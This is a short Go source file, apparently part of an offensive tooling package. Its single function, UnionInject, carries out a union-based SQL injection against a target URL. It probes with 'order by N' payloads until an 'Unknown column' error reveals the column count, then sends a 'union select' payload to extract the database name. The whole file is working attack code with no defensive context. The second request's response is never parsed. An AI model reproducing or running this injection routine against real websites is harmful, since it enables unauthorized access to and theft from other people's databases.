package pkg

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

// 联合注入
func UnionInject(host string) error {
	var data []string
	payloads := []string{
		" order by %s",
		"-1 union select 1,database(),2",
	}
	//判断列数
	//order by 2
	for i := 1; ; i++ {
		req, err := http.Get(host + url.QueryEscape(fmt.Sprintf(payloads[0], strconv.Itoa(i))))
		fmt.Println(host + fmt.Sprintf(payloads[0], strconv.Itoa(i)))
		if err != nil {
			return err
		}
		if req.StatusCode == http.StatusOK {
			re := regexp.MustCompile(`Unknown column`)
			text, _ := io.ReadAll(req.Body)
			if re.FindString(string(text)) != "" {
				data = append(data, strconv.Itoa(i-1))
				req.Body.Close()
				break
			}
		}
		req.Body.Close()
	}

	//查找数据库
	// union select 1,database(),2
	host = host[:strings.LastIndex(host, "=")+1]
	req, err := http.Get(host + url.QueryEscape(payloads[1]))
	if err != nil {
		return err
	}
	defer req.Body.Close()

	fmt.Println(data)
	return nil

}
